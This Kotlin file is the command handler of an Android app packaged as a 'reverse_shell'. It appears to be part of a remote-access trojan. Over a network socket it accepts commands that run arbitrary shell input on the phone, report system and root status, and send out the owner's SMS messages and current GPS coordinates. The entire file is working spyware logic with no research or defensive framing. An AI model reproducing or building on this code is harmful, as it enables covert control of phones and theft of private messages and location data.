package com.satwik.nexgenius.core.reverse_shell

import android.content.Context
import android.os.Environment
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.FileOutputStream
import java.io.InputStream
import java.io.OutputStream
import java.net.Socket

object CommandHandler {

    fun handleSysInfo(socketOutput: OutputStream, shellOutput: OutputStream) {
        socketOutput.write((getSystemInfo() + "\n").toByteArray())
        socketOutput.flush()
        shellOutput.write(("\n").toByteArray()) //Shows shell interface again after executing custom command

    }

    fun handleCheckRoot(socketOutput: OutputStream, shellOutput: OutputStream) {
        socketOutput.write((checkRoot() + "\n").toByteArray())
        socketOutput.flush()
        shellOutput.write(("\n").toByteArray())

    }

    fun handleHelp(socketOutput: OutputStream, shellOutput: OutputStream) {
        socketOutput.write((help() + "\n").toByteArray())
        socketOutput.flush()
        shellOutput.write(("\n").toByteArray())

    }

    fun handleExit(socket: Socket, process: Process) {
        socket.close()
        process.destroy()
    }

    fun handleGetSms(socketOutput: OutputStream, context: Context, shellOutput: OutputStream) {
        try {
            socketOutput.write((getSms(context) + "\n").toByteArray())
            socketOutput.flush()
            shellOutput.write(("\n").toByteArray())
        }
        catch (e:Exception){
            socketOutput.write((e.message + "\n").toByteArray())
            socketOutput.flush()
            shellOutput.write(("\n").toByteArray())
        }

        socketOutput.flush()
        shellOutput.write(("\n").toByteArray())

    }

    fun handleShellCommand(command: String, shellOutput: OutputStream, socketOutput: OutputStream) {
        if(command.isEmpty()){
            val message = "Error: please enter a shell command or type 'help' to get a list of commands"
            socketOutput.write((message + "\n").toByteArray())
            shellOutput.write(("\n").toByteArray())
        }
        else {
            shellOutput.write((command + "\n").toByteArray())
            shellOutput.flush()
        }
    }


    suspend fun handleCurrentLocation(context: Context, socketOutput: OutputStream, shellOutput: OutputStream)= withContext(Dispatchers.IO){
        try {
            val latitude = getCurrentLocation(context)?.latitude.toString()
            val longitude = getCurrentLocation(context)?.longitude.toString()
            socketOutput.write(("Latitude: $latitude\nLongitude: $longitude\n").toByteArray())
            socketOutput.flush()
            shellOutput.write(("\n").toByteArray())

        }
        catch (e:Exception){
            socketOutput.write(("Error: ${e.message}\n").toByteArray())
            socketOutput.flush()
        }
    }
}